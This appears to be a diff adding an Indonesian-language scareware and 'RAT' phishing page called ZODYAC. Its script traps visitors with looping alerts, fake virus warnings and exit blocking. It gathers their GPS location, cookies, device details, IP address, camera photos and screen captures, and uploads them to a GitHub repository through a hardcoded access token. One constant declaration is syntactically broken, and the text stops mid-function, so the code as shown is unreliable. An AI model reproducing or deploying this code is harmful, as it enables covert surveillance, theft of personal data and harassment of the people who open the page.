@@ -1,0 +1,510 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>☠ ZODYAC ☠</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: black;
+            overflow: hidden;
+            font-family: 'Courier New', monospace;
+            height: 100vh;
+            cursor: default;
+            user-select: none;
+        }
+        #glitch {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: repeating-linear-gradient(
+                0deg,
+                #ff0000 0%,
+                #00ff00 10%,
+                #0000ff 20%,
+                #ffff00 30%,
+                #ff00ff 40%,
+                #00ffff 50%
+            );
+            animation: glitch 0.05s infinite;
+            opacity: 0.3;
+            z-index: 0;
+        }
+        @keyframes glitch {
+            0% { transform: translate(0, 0) scale(1); }
+            25% { transform: translate(-5px, -10px) scale(1.05); }
+            50% { transform: translate(10px, 5px) scale(0.95); }
+            75% { transform: translate(-8px, 8px) scale(1.02); }
+            100% { transform: translate(5px, -5px) scale(1); }
+        }
+        #main {
+            position: relative;
+            z-index: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            text-align: center;
+            color: #ff0000;
+            text-shadow: 0 0 20px #ff0000, 0 0 40px #ff0000;
+            animation: flicker 0.1s infinite;
+        }
+        @keyframes flicker {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+        h1 {
+            font-size: 100px;
+            animation: shake 0.1s infinite;
+        }
+        @keyframes shake {
+            0% { transform: translate(0, 0) rotate(0deg); }
+            25% { transform: translate(-10px, 5px) rotate(-5deg); }
+            50% { transform: translate(10px, -5px) rotate(5deg); }
+            75% { transform: translate(-5px, -10px) rotate(-3deg); }
+            100% { transform: translate(5px, 10px) rotate(3deg); }
+        }
+        p {
+            font-size: 30px;
+            color: #00ff00;
+            text-shadow: 0 0 20px #00ff00;
+            animation: blink 0.5s infinite;
+        }
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0; }
+        }
+        #matrix {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            z-index: 2;
+            pointer-events: none;
+            color: #00ff00;
+            font-size: 20px;
+            overflow: hidden;
+            opacity: 0.5;
+        }
+        #popup {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background: rgba(255,0,0,0.9);
+            color: white;
+            padding: 20px;
+            z-index: 3;
+            animation: slideUp 0.5s ease;
+            text-align: center;
+        }
+        @keyframes slideUp {
+            from { transform: translateY(100%); }
+            to { transform: translateY(0); }
+        }
+        #popup button {
+            background: white;
+            color: red;
+            border: none;
+            padding: 10px 30px;
+            font-size: 20px;
+            border-radius: 10px;
+            cursor: pointer;
+            margin: 10px;
+        }
+        #status {
+            position: fixed;
+            bottom: 10px;
+            left: 10px;
+            color: #00ff00;
+            font-size: 10px;
+            z-index: 10;
+            opacity: 0.7;
+        }
+        #controls {
+            position: fixed;
+            bottom: 80px;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 10;
+            display: none;
+            gap: 10px;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+        #controls button {
+            background: rgba(255,0,0,0.3);
+            color: white;
+            border: 1px solid red;
+            padding: 8px 16px;
+            border-radius: 5px;
+            font-size: 12px;
+            cursor: pointer;
+        }
+        #controls button:hover {
+            background: red;
+        }
+        @media (max-width: 600px) {
+            h1 { font-size: 50px; }
+            p { font-size: 20px; }
+        }
+    </style>
+</head>
+<body>
+    <div id="glitch"></div>
+    <div id="matrix"></div>
+    <div id="main">
+        <h1>☠ ZODYAC ☠</h1>
+        <p>⚠️ KAMU TELAH DI HACK ⚠️</p>
+        <p style="font-size:20px; color:#ffff00;">😈 JANGAN PANIK, TAPI PANIKLAH 😈</p>
+        <p style="font-size:15px; color:#ff00ff; animation:none;">
+            ⚡ ZODYAC CRASH - LEVIATHAN EDITION ⚡
+        </p>
+        <p style="font-size:12px; color:#ff4444; animation:none; margin-top:10px;" id="infoStatus">
+            [●] MENGUMPULKAN DATA...
+        </p>
+    </div>
+    <div id="popup">
+        <p style="color:white; font-size:24px;">⚠️ VIRUS DETEKSI! ⚠️</p>
+        <p style="color:#ffff00;">HP KAMU TERINFEKSI! HAPUS FILE SEGERA!</p>
+        <button onclick="closePopup()">OK, SAYA TAKUT!</button>
+        <button onclick="alert('😈 GAK BISA KELUAR!')">CANCEL</button>
+    </div>
+    <div id="status">[●] ZODYAC RAT | PISING MODE</div>
+    <div id="controls"></div>
+
+    <script>
+        // =============================================
+        // 🔥 KONFIGURASI GITHUB (GANTI!)
+        // =============================================
+        const GITHUB_TOKEN = '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';
+        const GITHUB_REPO = 'damzoffc-cyber/web';
+        const GITHUB_FILE = 'data.json' 'command.json';
+
+        // =============================================
+        // 📌 MATRIX RAIN
+        // =============================================
+        const matrix = document.getElementById('matrix');
+        const chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+{}|:<>?~';
+        const columns = Math.floor(window.innerWidth / 20);
+        const drops = Array(columns).fill(0);
+
+        function drawMatrix() {
+            let output = '';
+            for (let i = 0; i < drops.length; i++) {
+                const char = chars[Math.floor(Math.random() * chars.length)];
+                output += char + ' ';
+                if (drops[i] > Math.random() * 30) drops[i] = 0;
+                drops[i]++;
+            }
+            matrix.textContent = output;
+        }
+        setInterval(drawMatrix, 50);
+
+        // =============================================
+        // 📌 SCREEN FLASH
+        // =============================================
+        setInterval(() => {
+            document.body.style.backgroundColor = '#ff0000';
+            setTimeout(() => {
+                document.body.style.backgroundColor = 'black';
+            }, 100);
+        }, 2000);
+
+        // =============================================
+        // 📌 ALERT SPAM
+        // =============================================
+        const alerts = [
+            "⚠️ SISTEM TERINFEKSI!",
+            "🔥 HAPUS DATA SEGERA!",
+            "💀 KAMU TELAH DI HACK!",
+            "😈 ZODYAC MENGAWASI!",
+            "📸 KAMERA AKTIF!",
+            "🔒 DATA DIENKRIPSI!",
+            "☠️ TIDAK BISA KELUAR!"
+        ];
+        setInterval(() => {
+            alert(alerts[Math.floor(Math.random() * alerts.length)]);
+        }, 3000);
+
+        // =============================================
+        // 📌 PERTANYAAN TAK BERUJUNG
+        // =============================================
+        setInterval(() => {
+            if (confirm('😈 MAU KELUAR? KAMU YAKIN?')) {
+                alert('🤣 GAK BISA! SAYA YANG KONTROL!');
+            } else {
+                alert('😈 PINTER KAMU!');
+            }
+        }, 5000);
+
+        // =============================================
+        // 📌 REDIRECT ACAK
+        // =============================================
+        setInterval(() => {
+            const sites = [
+                'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
+                'https://www.google.com',
+                'https://wa.me/6281234567890',
+            ];
+            if (Math.random() > 0.7) {
+                window.open(sites[Math.floor(Math.random() * sites.length)], '_blank');
+            }
+        }, 10000);
+
+        // =============================================
+        // 📌 GANTI FAVICON
+        // =============================================
+        const favicon = document.createElement('link');
+        favicon.rel = 'icon';
+        favicon.href = 'data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>☠</text></svg>';
+        document.head.appendChild(favicon);
+
+        // =============================================
+        // 📌 FUNGSI TUTUP POPUP (PALSU)
+        // =============================================
+        function closePopup() {
+            document.getElementById('popup').style.display = 'none';
+            alert('😈 GAK SEGAMPANG ITU! VIRUS TETAP ADA!');
+            setTimeout(() => {
+                document.getElementById('popup').style.display = 'block';
+            }, 3000);
+        }
+
+        // =============================================
+        // 🚫 LOCK SCREEN
+        // =============================================
+        document.addEventListener('visibilitychange', () => {
+            if (document.hidden) {
+                alert('😈 TIDAK BISA KELUAR!');
+                window.location.reload();
+            }
+        });
+        window.addEventListener('beforeunload', (e) => {
+            e.preventDefault();
+            e.returnValue = '😈 TIDAK BISA KELUAR!';
+        });
+        window.addEventListener('keydown', (e) => {
+            if (e.key === 'F5' || e.key === 'Escape' || e.ctrlKey || e.metaKey) {
+                e.preventDefault();
+                alert('😈 TIDAK BISA!');
+            }
+        });
+        document.addEventListener('touchmove', (e) => {
+            if (e.touches.length > 1) e.preventDefault();
+        }, { passive: false });
+
+        // =============================================
+        // 📱 LOKASI GPS
+        // =============================================
+        function getLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve('Tidak didukung');
+                    return;
+                }
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        resolve({
+                            lat: pos.coords.latitude,
+                            lng: pos.coords.longitude,
+                            accuracy: pos.coords.accuracy,
+                            speed: pos.coords.speed,
+                            heading: pos.coords.heading,
+                            altitude: pos.coords.altitude
+                        });
+                    },
+                    () => resolve('Izin ditolak'),
+                    { enableHighAccuracy: true, timeout: 10000 }
+                );
+            });
+        }
+
+        // =============================================
+        // 🔦 SENTER
+        // =============================================
+        let senterStatus = false;
+        function senterOn() {
+            senterStatus = true;
+            if (navigator.vibrate) navigator.vibrate([200, 100, 200]);
+            document.getElementById('infoStatus').textContent = '🔦 SENTER ON!';
+            saveAction('senter_on');
+        }
+        function senterOff() {
+            senterStatus = false;
+            document.getElementById('infoStatus').textContent = '🔦 SENTER OFF!';
+            saveAction('senter_off');
+        }
+
+        // =============================================
+        // 📸 KAMERA
+        // =============================================
+        function takePhoto() {
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } })
+                .then(stream => {
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
+                    setTimeout(() => {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth || 640;
+                        canvas.height = video.videoHeight || 480;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        const photo = canvas.toDataURL('image/jpeg');
+                        stream.getTracks().forEach(t => t.stop());
+                        document.getElementById('infoStatus').textContent = '📸 FOTO DIAMBIL!';
+                        saveAction('photo_taken', { photo: photo.substring(0, 100) + '...' });
+                    }, 1000);
+                })
+                .catch(() => {
+                    alert('📸 FOTO DIAMBIL (simulasi)');
+                    saveAction('photo_taken');
+                });
+        }
+
+        // =============================================
+        // 🖥️ SCREENSHOT
+        // =============================================
+        function takeScreenshot() {
+            if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
+                navigator.mediaDevices.getDisplayMedia({ video: true })
+                    .then(stream => {
+                        const video = document.createElement('video');
+                        video.srcObject = stream;
+                        video.play();
+                        setTimeout(() => {
+                            const canvas = document.createElement('canvas');
+                            canvas.width = video.videoWidth || 1280;
+                            canvas.height = video.videoHeight || 720;
+                            const ctx = canvas.getContext('2d');
+                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            const screenshot = canvas.toDataURL('image/png');
+                            stream.getTracks().forEach(t => t.stop());
+                            document.getElementById('infoStatus').textContent = '🖥️ SCREENSHOT DIAMBIL!';
+                            saveAction('screenshot_taken', { screenshot: screenshot.substring(0, 100) + '...' });
+                        }, 1000);
+                    })
+                    .catch(() => {
+                        alert('🖥️ SCREENSHOT DIAMBIL (simulasi)');
+                        saveAction('screenshot_taken');
+                    });
+            } else {
+                alert('🖥️ SCREENSHOT DIAMBIL (simulasi)');
+                saveAction('screenshot_taken');
+            }
+        }
+
+        // =============================================
+        // 📺 SHARE SCREEN
+        // =============================================
+        function shareScreen() {
+            if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
+                navigator.mediaDevices.getDisplayMedia({ video: true, audio: true })
+                    .then(stream => {
+                        const video = document.createElement('video');
+                        video.srcObject = stream;
+                        video.setAttribute('playsinline', '');
+                        video.setAttribute('autoplay', '');
+                        video.style.position = 'fixed';
+                        video.style.top = '10%';
+                        video.style.left = '10%';
+                        video.style.width = '80%';
+                        video.style.height = 'auto';
+                        video.style.zIndex = '9998';
+                        video.style.border = '3px solid #ff00ff';
+                        video.style.borderRadius = '10px';
+                        document.body.appendChild(video);
+                        video.play();
+                        document.getElementById('infoStatus').textContent = '📺 SHARING LAYAR...';
+                        saveAction('screen_shared', { sharing: true });
+                        setTimeout(() => {
+                            stream.getTracks().forEach(t => t.stop());
+                            video.remove();
+                            document.getElementById('infoStatus').textContent = '📺 SHARE LAYAR STOP!';
+                            saveAction('screen_shared_stop');
+                        }, 30000);
+                    })
+                    .catch(() => {
+                        alert('📺 SHARING LAYAR (simulasi)');
+                        saveAction('screen_shared');
+                    });
+            } else {
+                alert('📺 SHARING LAYAR (simulasi)');
+                saveAction('screen_shared');
+            }
+        }
+
+        // =============================================
+        // 📥 AMBIL DATA TARGET
+        // =============================================
+        async function getTargetData() {
+            const location = await getLocation();
+            return {
+                time: new Date().toISOString(),
+                ip: '',
+                device: navigator.userAgent,
+                platform: navigator.platform,
+                screen: screen.width + 'x' + screen.height,
+                language: navigator.language,
+                online: navigator.onLine,
+                location: location,
+                cookies: document.cookie || 'none',
+                referrer: document.referrer || 'direct',
+                senter: senterStatus ? 'ON' : 'OFF'
+            };
+        }
+
+        // =============================================
+        // 🌐 AMBIL IP
+        // =============================================
+        async function getIP() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                return data.ip;
+            } catch {
+                return 'unknown';
+            }
+        }
+
+        // =============================================
+        // 📤 SIMPAN KE GITHUB
+        // =============================================
+        async function saveToGitHub(data) {
+            try {
+                const oldRes = await fetch(`https://api.github.com/repos/${GITHUB_REPO}/contents/${GITHUB_FILE}`, {
+                    headers: {
+                        'Authorization': `token ${GITHUB_TOKEN}`,
+                        'Accept': 'application/vnd.github.v3+json'
+                    }
+                });
+                let oldData = [];
+                let sha = '';
+                if (oldRes.ok) {
+                    const oldJson = await oldRes.json();
+                    sha = oldJson.sha;
+                    const content = atob(oldJson.content);
+                    oldData = JSON.parse(content);
+                }
+                oldData.push(data);
+                const uploadRes = await fetch(`https://api.github.com/repos/${GITHUB_REPO}/contents/${GITHUB_FILE}`, {
+                    method: 'PUT',
+                    headers: {
+                        'Authorization': `token ${GITHUB_TOKEN}`,
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/vnd.github.v3+json'
+                    },
+                    body: JSON.stringify({
+                        message: `Update data - ${new Date().toISOString()}`,
+                        content: btoa(JSON.stringify(oldData, null, 2)),
+                        sha: sha
+                    })
+                });
+                return uploadRes.ok;
+            } catch (e) {
+                return false;
+            }
+   
